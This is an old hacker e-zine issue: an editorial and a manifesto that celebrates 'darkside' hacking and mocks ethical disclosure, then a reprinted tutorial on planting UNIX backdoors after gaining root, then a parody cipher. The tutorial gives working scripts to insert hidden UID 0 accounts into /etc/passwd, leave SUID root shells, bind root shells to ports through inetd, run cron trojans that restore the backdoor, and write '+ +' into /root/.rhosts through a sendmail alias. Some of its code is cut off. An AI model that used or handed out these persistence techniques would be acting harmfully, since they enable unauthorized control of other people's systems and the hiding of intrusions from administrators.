==============================================================================

Phear ye, phear ye! Just when you thought it was safe to cancel your subscrip-
tion to Bugtraq, comes the return of BoW. That's right folks, the people who
brought you the ever-pheared .rhosts explo1t and sh0ck3d th3 world with the
release of d4l3 dr3w's gerbling photos are back in 1999 with h-bomb force.

Here we are on the verge of the new millenium, and now the torch has been
passed from Pluvius to myself for editorship of the most pheared newsletter
on the face of the planet. We've seen busts (well, duh), h4qr wars, h4tr3d, 
l0ve, n4rqs, w3dd1ngz, fun3ralz, d1v0rc3, and a degredation of the scene so
bad that the only requirement for being called a hacker these days seems to
be the ability to breathe. 

And through it all, the Inner Sanctum of Bow has been watching. Laughing for
the most part. Yet here we are, f00tl00se and ph4ncy-phr33, after all that
has happened since BoW #8. Have we been to jail? No. Do we 0wn you? Chances
are, yes.

"Fuck," you might be thinking "these bastards have a pretty inflated ego."

Well guess what, we do. But don't forget:

                     EGO = (E)veryone's (G)etting (O)wned

This ninth issue of BoW is sure to b3 a real treat. We've got the freshest
war3z out there, and I guarantee you you won't find a better sell-by date
anywhere else. Just keep in mind that this is my first jab at being editor
so you'll have to forgive any mistakes I make along the way. Well, you don't
really have to, but I assure you I won't lose any sleep over it.

If you think you're k-rad enough for BoW, and you'd like to see your name
up in lights, then feel free to submit an article to bow@velkro.net. You can
also send any letters, or feedback to that address. If you're particularly
paranoid, the new BoW pgp key is available a little further down. We're
also always on the lookout for k-kewl ascii artwork to grace the pages of
our hallowed journal, so send us yer favorite creation while your at it. 
Submission does not guarantee publication, but it's worth a try.

Well, that about sums things up for this issue. Besides, there's not much
else to be said. So, on with the show and get set to enter Phear Nation%&!@#!

                                    - 30 -

                  -**=< BoW Y2K compliance statement >=**-
                                By: Pluvius

All versions of BoW starting at version 9.0 are fully Y2K compliant. 

Unfortunately earlier versions of BoW, specifically version 1, 2, 3, 4, 
portions of verion 5, all of version 6, 7 and also version 8 are *not* Y2K 
compliant. It is important to note that all of these versions of BoW were 
released  during or prior to 1994 which is well before the Y2K issue was a 
known problem (the movie 'Strange Days' didn't even come out until 1995). So 
we really don't feel it was our responsibility to make sure that these 
versions were Y2K compliant. Unfortunately, the older versions of BoW will 
cease to exist when the clock passes midnight, December 31st, 1999. We spent
a lot of energy trying to find a work around, but there was none apparent. 
Our consultants have  suggested that we urge readers to set their clocks to
Decemeber 31st, 1989 to avoid loss of precious data.

  BoW Magazine is an electronic magazine published whenever we feel like it,
  (literally -- it's been five years since we last came out with an issue)
  specializing in Computer Deviancy, Software Piracy, Computer Insecurity,
  Telecommunications Fraud, and other nasty things. The longdistance carriers
  phear us.

  BoW Magazine is KopyWrong (K) 1999. Any unauthorized distribution is
  k-lame, and we will get Tsut0mu Sh1m0mur4 t0 track you down, narq you out,
  hire a bad journalist to help him write a mediocre book about it, 
  wh0re himself to the media, and generally capitalize off your misfortune,
  if you distribute these electrons without prior consent of God. God can be
  reached in New York City, on the subway. Grab a ride and ask him... then it
  will be ok. You can also distribute this magazine in an unauthorized fashion
  if either a) Eugene Spafford or b) A Real Cyberpunk [in the event you do not
  know Eugene Spafford] say it's ok. Real Cyberpunks can be reached at the
  following email addresses: idol@well.sf.ca.us, president@whitehouse.gov,
  root@att.att.com, and root@microsoft.com. If you don't have access to email,
  then call up a cyberpunk at the following phone number: 0. Ask them... but
  first ask them for some k0d3z, it's a secret codeline. Tell them you would
  like to distribute BoW magazine in an unauthorized fashion. They will be
  able to give you permission.

==============================================================================

                         <----] What is BoW? [---->

BoW is a fraternal organization for like minded inviduals.

BoW is a virtual sanctuary for the exploration of the so called "darkside" of
the "hacker" ethic.  BoW serves a twofold purpose, one being of course the
artistic interpretation of what is now a stagnated "scene" using the ascii
medium (the zine). Secondly BoW serves as an engine of stratification;
employed mercilessly by it's high ranking members.

                 <----] How does one become a member? [---->

BoW members are born not made, if you truly are BoW material: you will be
recognized as such by the governing council and invited to take refuge amongst
our membership.  Once invited you will be subjected to a series of ordeals,
no two members are put through the same test as each individual is recognized
as the subjectively encapsulated being that he / she is.

The Aeon of BoW began in 1992 when the existing scene paradigm was redefined
by my utterance of the word "Phear" and I was recognized to the station of
"Phearless Leader" by the existing governing council.  This council was born
out of the ashes of what once served as the largest H/P organization in the
world:  VirtualCon.  Never heard of it?  You either weren't around, or if you
were, you were likely a worthless social scene parasite and not actively 
involved in anything.

                        <----] Why "darkside"? [----> 

At the time of BoW's inception, the existing hacker "ethic" was riddled with
such drug-addled hippy slogans as "information wants to be free",
"if ___ is outlawed, only outlaws will have ___", etc.  There was an alarming
trend towards what the socio-political faction of the "scene" termed "ethical
hacking" which if you reduced it to it's base elements you would find it 
roughly translated to the following:

            - kiss as much ass as possible as it may one day
              lead to employment.

            - turn over every exploit you are either given or
              discover on your own to security professionals 
              and organizations such as CERT for kudos.
    
            - post all exploits, etc to newsgroups such as 
              bugtraq, etc so that you can gain recognition
              from your peers. (sounds a bit like the warez
              scene doesn't it?)
    
            - when it is politically correct to do so, 
              reprimand other hackers publically for actually
              hacking / phreaking.
    
            - kick / ban anyone from hack / phreak irc channels
              when they ask a question you cannot either answer
              or are too ignorant to understand.
    
            - support the presence of law enforcement and / or
              "narqs" at both public conventions or forums on 
              the internet such as irc, etc.
    
            - Play word games in order to avoid ever having to
              make any sort of commitment through individual 
              action.  ie: hacking / phreaking.  When it is
              convenient to do so (ie: to impress ur friends)
              then the ethical hacker is of course a "darkside"
              hacker openly breaking computer crime laws but of
              course when one is amongst other "ethical hackers"
              one has to put on airs to the contrary.
    
            - Hide behind your copy of the K&R white book and 
              insist that C programming is an arcane and 
              esoteric skill known only to the few.  (*laff*)
    
BoW recognized this for the dangerous paradigm that it was and immediately 
issued a stern commitment to the anathema of all that the "ethical hacker"
stood for.  At the same time, a media whore pseudo-journalist by the name of
"John Markhoff" , realizing that his poor writing skills and attention 
defecit disorder would never get him anywhere, sought to further his career
by focusing his pen on the antics of Kevin Mitnick.  He termed Kevin, a 
"darkside" hacker in the pages of his book "Cyberpunk" and defined the term
with negative connotations.  

BoW recognized John Markhoff for the trash that he is and decided to reclaim
the word that Kevin Mitnick had chosen to martyr himself for.

BoW became resonant with the DARKSIDE and continues to evolve the archetype
of the darkside hacker to this day...

Enter the corporations and the commercialization of our playground...
With that came the ISP...  
And more than likely, with those two events: YOU CAME TO OUR WORLD.

Were you on the internet before the ISP was born?  

If your access were removed tomorrow could you find your way back to our 
world without purchasing it? Without begging for it? Without having to read
a pop up book or text file, could you do it?

If the internet completely ceased to exist tomorrow, where would you go? 
Could you find us again?  Do you know the way?

Did you answer the question, or are you too busy insisting that you have
earned your right to be here?

* What is your raeson d'etre? *

Are you a genuine seeker or do you merely want to be like us?  To get the 
attention we get without trying?

* Are you prepared to go all the way? *

When your doors are being kicked down, when your beloved computers and
assorted electronic equipment are being indexed and carried out your door by
THE MAN are you going to cry?

Are you going to turn all your friends in?  Friends that trusted you with
information about them?  Those that you spent your free time posturing in
front of, bragging to, telling them that you were the real thing... Will you
sell them out because you are a FAKE?

Is the freedom of others worth all that?  Is *your* freedom worth all that?

To trade them both for a few moments of empty posturing?

* DID YOU THINK YOU WERE FOR REAL? *

                               UNIX Backdoors
                                Dec 16, 1995 
     _________________________________________________________________
                                       
   Ok..... You've been at it for all night. Trying all the exploits you
   can think of. The system seems tight. The system looks tight. The
   system *is* tight. You've tried everything. Default passwds, guessable
   passwds, NIS weaknesses, NFS holes, incorrect permissions, race
   conditions, SUID exploits, Sendmail bugs, and so on... Nothing. WAIT!
   What's that!?!? A "#" ???? Finally! After seeming endless toiling,
   you've managed to steal root. Now what? How do you hold onto this
   precious super-user privilege you have worked so hard to achieve....?
   
   This article is intended to show you how to hold onto root once you
   have it. It is intended for hackers and administrators alike. From a
   hacking perspective, it is obvious what good this paper will do you.
   Admin's can likewise benefit from this paper. Ever wonder how that
   pesky hacker always manages to pop up, even when you think you've
   completely eradicated him from your system?
   This list is BY NO MEANS comprehensive. There are as many ways to
   leave backdoors into a UNIX computer as there are ways into one.
   
     _________________________________________________________________
                                      
Beforehand

   Know the location of critical system files. This should be obvious (If
   you can't list any of the top of your head, stop reading now, get a
   book on UNIX, read it, then come back to me...). Familiarity with
   passwd file formats (including general 7 field format, system specific
   naming conventions, shadowing mechanisms, etc...). Know vi. Many
   systems will not have those robust, user-friendly editors such as Pico
   and Emacs. Vi is also quite useful for needing to quickly seach and
   edit a large file. If you are connecting remotely (via
   dial-up/telnet/rlogin/whatver) it's always nice to have a robust
   terminal program that has a nice, FAT scrollback buffer. This will
   come in handy if you want to cut and paste code, rc files, shell
   scripts, etc...
   
   The permenance of these backdoors will depend completely on the
   technical saavy of the administrator. The experienced and skilled
   administrator will be wise to many (if not all) of these backdoors.
   But, if you have managed to steal root, it is likely the admin isn't
   as skilled (or up to date on bug reports) as she should be, and many
   of these doors may be in place for some time to come. One major thing
   to be aware of, is the fact that if you can cover you tracks during
   the initial break-in, no one will be looking for back doors.
   
     _________________________________________________________________
                                      
The Overt

   [1] Add a UID 0 account to the passwd file. This is probably the most
   obvious and quickly discovered method of rentry. It flies a red flag
   to the admin, saying "WE'RE UNDER ATTACK!!!". If you must do this, my
   advice is DO NOT simply prepend or append it. Anyone causally
   examining the passwd file will see this. So, why not stick it in the
   middle...
   
#!/bin/csh
# Inserts a UID 0 account into the middle of the passwd file.
# There is likely a way to do this in 1/2 a line of AWK or SED.  Oh well.
# daemon9@netcom.com

set linecount = `wc -l /etc/passwd`
cd                                      # Do this at home.
cp /etc/passwd ./temppass               # Safety first.
echo passwd file has $linecount[1] lines.
@ linecount[1] /= 2
@ linecount[1] += 1                     # we only want 2 temp files
echo Creating two files, $linecount[1] lines each \(or approximately that\).
split -$linecount[1] ./temppass         # passwd string optional
echo "EvilUser::0:0:Mr. Sinister:/home/sweet/home:/bin/csh" >> ./xaa
cat ./xab >> ./xaa
mv ./xaa /etc/passwd
chmod 644 /etc/passwd                   # or whatever it was beforehand
rm ./xa* ./temppass
echo Done...

   NEVER, EVER, change the root password. The reasons are obvious.
   
   [2] In a similar vein, enable a disabled account as UID 0, such as
   Sync. Or, perhaps, an account somwhere buried deep in the passwd file
   has been abandoned, and disabled by the sysadmin. Change her UID to 0
   (and remove the '*' from the second field).
   
   [3] Leave an SUID root shell in /tmp.
   
#!/bin/sh
# Everyone's favorite...

cp /bin/csh /tmp/.evilnaughtyshell      # Don't name it that...
chmod 4755 /tmp/.evilnaughtyshell

   Many systems run cron jobs to clean /tmp nightly. Most systems clean
   /tmp upon a reboot. Many systems have /tmp mounted to disallow SUID
   programs from executing. You can change all of these, but if the
   filesystem starts filling up, people may notice...but, hey, this *is*
   the overt section....). I will not detail the changes neccessary
   because they can be quite system specific. Check out
   /var/spool/cron/crontabs/root and /etc/fstab.

The Veiled

   [4] The super-server configuration file is not the first place a
   sysadmin will look, so why not put one there? First, some background
   info: The Internet daemon (/etc/inetd) listens for connection requests
   on TCP and UDP ports and spawns the appropriate program (usally a
   server) when a connection request arrives. The format of the
   /etc/inetd.conf file is simple. Typical lines look like this:
   
(1)     (2)     (3)     (4)     (5)     (6)             (7)
ftp     stream  tcp     nowait  root    /usr/etc/ftpd   ftpd
talk    dgram   udp     wait    root    /usr/etc/ntalkd ntalkd

   Field (1) is the daemon name that should appear in /etc/services. This
   tells inetd what to look for in /etc/services to determine which port
   it should associate the program name with. (2) tells inetd which type
   of socket connection the daemon will expect. TCP uses streams, and UDP
   uses datagrams. Field (3) is the protocol field which is either of the
   two transport protocols, TCP or UDP. Field (4) specifies whether or
   not the daemon is iterative or concurrent. A 'wait' flag indicates
   that the server will process a connection and make all subsequent
   connections wait. 'Nowait' means the server will accept a connection,
   spawn a child process to handle the connection, and then go back to
   sleep, waiting for further connections. Field (5) is the user (or more
   inportantly, the UID) that the daemon is run as. (6) is the program to
   run when a connection arrives, and (7) is the actual command (and
   optional arguments). If the program is trivial (usally requiring no
   user interaction) inetd may handle it internally. This is done with an
   'internal' flag in fields (6) and (7).
   So, to install a handy backdoor, choose a service that is not used
   often, and replace the daemon that would normally handle it with
   something else. A program that creates an SUID root shell, a program
   that adds a root account for you in the /etc/passwd file, etc...
   For the insinuation-impaired, try this:
   
   Open the /etc/inetd.conf in an available editor. Find the line that
   reads:
   
        
        daytime stream  tcp     nowait  root    internal

   and change it to:
   
        daytime stream  tcp     nowait /bin/sh  sh -i.

   You now need to restart /etc/inetd so it will reread the config file.
   It is up to you how you want to do this. You can kill and restart the
   process, (kill -9 , /usr/sbin/inetd or /usr/etc/inetd) which will
   interuppt ALL network connections (so it is a good idea to do this off
   peak hours).
   
   [5] An option to compromising a well known service would be to install
   a new one, that runs a program of your choice. One simple solution is
   to set up a shell the runs similar to the above backdoor. You need to
   make sure the entry appears in /etc/services as well as in
   /etc/inetd.conf. The format of the /etc/services file is simple:
   
(1)       (2)/(3)          (4)
smtp      25/tcp           mail

   Field (1) is the service, field (2) is the port number, (3) is the
   protocol type the service expects, and (4) is the common name
   associated with the service. For instance, add this line to
   /etc/services:
   
        evil    22/tcp          evil

   and this line to /etc/inetd.conf:
   
        evil    stream  tcp     nowait  /bin/sh sh -i

   Restart inetd as before.
   
   Note: Potentially, these are a VERY powerful backdoors. They not only
   offer local rentry from any account on the system, they offer rentry
   from *any* account on *any* computer on the Internet.
   
   [6] Cron-based trojan I. Cron is a wonderful system administration
   tool. It is also a wonderful tool for backdoors, since root's crontab
   will, well, run as root... Again, depending on the level of experience
   of the sysadmin (and the implementation), this backdoor may or may not
   last. /var/spool/cron/crontabs/root is where root's list for crontabs
   is usally located. Here, you have several options. I will list a only
   few, as cron-based backdoors are only limited by your imagination.
   Cron is the clock daemon. It is a tool for automatically executing
   commands at specified dates and times. Crontab is the command used to
   add, remove, or view your crontab entries. It is just as easy to
   manually edit the /var/spool/crontab/root file as it is to use
   crontab. A crontab entry has six fields:
   
(1)     (2)     (3)     (4)     (5)     (6)
 0       0       *       *       1       /usr/bin/updatedb

   Fields (1)-(5) are as follows: minute (0-59), hour (0-23), day of the
   month (1-31) month of the year (1-12), day of the week (0-6). Field
   (6) is the command (or shell script) to execute. The above shell
   script is executed on Mondays. To exploit cron, simply add an entry
   into /var/spool/crontab/root. For example: You can have a cronjob that
   will run daily and look in the /etc/passwd file for the UID 0 account
   we previously added, and add him if he is missing, or do nothing
   otherwise (it may not be a bad idea to actually *insert* this shell
   code into an already installed crontab entry shell script, to further
   obfuscate your shady intentions). Add this line to
   /var/spool/crontab/root:
   
        0       0       *       *       *       /usr/bin/trojancode

   This is the shell script:
   
#!/bin/csh
# Is our eviluser still on the system?  Let's make sure he is.
#daemon9@netcom.com

set evilflag = (`grep eviluser /etc/passwd`)


if($#evilflag == 0) then                        # Is he there?
        
        set linecount = `wc -l /etc/passwd`
        cd                                      # Do this at home.
        cp /etc/passwd ./temppass               # Safety first.
        @ linecount[1] /= 2
        @ linecount[1] += 1                     # we only want 2 temp files
        split -$linecount[1] ./temppass         # passwd string optional
        echo "EvilUser::0:0:Mr. Sinister:/home/sweet/home:/bin/csh" >> ./xaa
        cat ./xab >> ./xaa
        mv ./xaa /etc/passwd
        chmod 644 /etc/passwd                   # or whatever it was beforehand
        rm ./xa* ./temppass
        echo Done...
else
endif

   [7] Cron-based trojan II. This one was brought to my attention by our
   very own Mr. Zippy. For this, you need a copy of the /etc/passwd file
   hidden somewhere. In this hidden passwd file (call it
   /var/spool/mail/.sneaky) we have but one entry, a root account with a
   passwd of your choosing. We run a cronjob that will, every morning at
   2:30am (or every other morning), save a copy of the real /etc/passwd
   file, and install this trojan one as the real /etc/passwd file for one
   minute (synchronize swatches!). Any normal user or process trying to
   login or access the /etc/passwd file would get an error, but one
   minute later, everything would be ok. Add this line to root's crontab
   file:
   

        29      2       *       *       *       /bin/usr/sneakysneaky_passwd

   make sure this exists:
   
#echo "root:1234567890123:0:0:Operator:/:/bin/csh" > /var/spool/mail/.sneaky

   and this is the simple shell script:
   
#!/bin/csh
# Install trojan /etc/passwd file for one minute
#daemon9@netcom.com

cp /etc/passwd /etc/.temppass
cp /var/spool/mail/.sneaky /etc/passwd
sleep 60
mv /etc/.temppass /etc/passwd

   [8] Compiled code trojan. Simple idea. Instead of a shell script, have
   some nice C code to obfuscate the effects. Here it is. Make sure it
   runs as root. Name it something innocous. Hide it well.

        [9] The sendmail aliases file.  The sendmail aliases file allows for
mail sent to a particular username to either expand to several users, or
perhaps pipe the output to a program.  Most well known of these is the
uudecode alias trojan.  Simply add the line:

 "decode: "|/usr/bin/uudecode"

        to the /etc/aliases file.  Usally, you would then create a uuencoded
.rhosts file with the full pathname embedded.

#! /bin/csh

# Create our .rhosts file.  Note this will output to stdout.

echo "+ +" > tmpfile
/usr/bin/uuencode tmpfile /root/.rhosts

        Next telnet to the desired site, port 25.  Simply fakemail to decode
and use as the subject body, the uuencoded version of the .rhosts file.  For
a one liner (not faked, however) do this:

%echo "+ +" | /usr/bin/uuencode /root/.rhosts | mail decode@target.com

        You can be as creative as you wish in this case.  You can setup an
alias that, when mailed to, will run a program of your choosing.  Many of
the previous scripts and methods can be employed here.

The Covert




        [10] Trojan code in common programs.  This is a rather sneaky method
that is really only detectable by programs such tripwire.  The idea is
simple:  insert trojan code in the source of a commonly used program.
Some of most useful programs to us in this case are su, login and passwd
because they already run SUID root, and need no permission modification.
Below are some general examples of what you would want to do, after obtaining
the correct sourcecode for the particular flavor of UNIX you are backdooring.
(Note:  This may not always be possible, as some UNIX vendors are not so
generous with thier sourcecode.)  Since the code is very lengthy and
different for many flavors, I will just include basic psuedo-code:

get input;
if input is special hardcoded flag, spawn evil trojan;
else if input is valid, continue;
else quit with error;
...

        Not complex or difficult.  Trojans of this nature can be done in
less than 10 lines of additional code.

The Esoteric



        [11] /dev/kmem exploit.  It represents the virtual of the system.
Since the kernel keeps it's parameters in memory, it is possible to modify the
memory of the machine to change the UID of your processes.  To do so requires
that /dev/kmem have read/write permission.  The following steps are executed:
Open the /dev/kmem device, seek to your page in memory, overwrite the UID of
your current process, then spawn a csh, which will inherit this UID.  The
following program does just that.

/* If /kmem is is readable and writable, this program will change the user's
UID and GID to 0.  */
/* This code originally appeared in "UNIX security:  A practical tutorial"
with some modifications by daemon9@netcom.com */

}

        [12] Since the previous code requires /dev/kmem to be world accessable,

and this is not likely a natural event, we need to take care of this.  My
advice is to write a shell script similar to the one in [7] that will change
the permissions on /dev/kmem for a discrete amount of time (say 5 minutes)
and then restore the original permissions.  You can add this source to the
source in [7]:

chmod 666 /dev/kmem
sleep 300               # Nap for 5 minutes
chmod 600 /dev/kmem     # Or whatever it was before

Cyberpunk author Neal Stephenson recently solicited a few top notch crypto 
folks for some non-computer based cryptography for his new book, Cryptonomicon.
For this project, he approached only two cryptographers; that sissy Bruce 
Schneier and our very own Velkr0 "I put the K in K0de" K0d3 W4rr10r. Now, Neal
not being very a smart person, ended up using that other guy's system. However,
presented here is the d00d-sp3ak low-tech cryptography system that Velkro 
came up with.
                          
                                
                                INTRODUCTION:

    -- Th3 V3lkr0 K0d3 \/\/4rr10r


                                METHODOLOGY:
                                ^^^^^^^^^^^^

As stated before, this system employs d00d-speak to hide messages.

Take the phrase:
 "haY d00d!!*$& g1mm3 s0m3 k0d3z s0 th4t eYe k4n kall mie GrrrLL1e."

We convert this phrase to normal english:
 "hey dude, give me some codes so that I can call my girlfriend."

And then take the common letters in the order they appear:
 "haY d00d!!*$& g1mm3 s0m3 k0d3z s0 th4t eYe k4n kall mie GrrrLL1e."
 "hey dude, give me some codes so that I can call my girlfriend."
  _ _ _ _   _    _  _ _    _   _  __ _     _  ___ _  _ __   _
  h y d d   g    e  s m    d   s  th t     n  all m  g rl   e

Notice that the only letters selected are ones that appear in both the 
original k-rad phrase, and the resulting plain-english translation. For this
system, differences in case are ignored.

So in this situation, the real message is:

    hyddgesmdsthtnallmgrle

Which just happens to be Swahili for:

    "Henry Hyde was the one on the grassy nole."

(you can see why this message had to be heavily encrypted!@##!)


Let's try some more:
--------------------

Original: 
    sM4K m3 s+00p1d!! th3r3z 4 V1ruz 1n m3 0-D4Y!

Translation:
    smack me stupid, there is a virus in my zero-day.
    --  - -  -  - -  -- -       - --   - -       - -
    sm  k m  s  p d  th r       v ru   n m       d y

Resulting Phrase:
    smkmspdthrvrunmdy

Which is Swedish for: 
    "the firewall can't hold up much longer. Let's go fishing"


And lastly:
-----------

Original:
    y0y0y0, YP 0wnz y3r ph4T azz#*%2*! p01n+ Y3r sKriPTZ @ 
    y3R M0mma t0n1ght, BAYBEE!

Translation:

    y                          y         p      wn  y  r   t a    p  n  y  r

            s ript     y  r m      t n ght  bab      
    
Resulting Phrase:
    yypwnyrtapnyrsriptyrmtnghtbab

Which is Russian for:
    "Comrade! Pick up some vodka and a soldering iron on your way home from
    the brothel!"


                                  NOTES:
                                  ^^^^^^

It turns out that a keen understanding of many foreign languages is needed
to effectively use d00d-speak crypto. However that is seen as a minor 
barrier. The use of many languages provides added flexibility to this system. 
Provided you have the appropriate language skills, d00d-speak crypto
can be a fast and versatile way of communicating in secret, especially when
computer-based crypto packages such as PGP are unavailable.
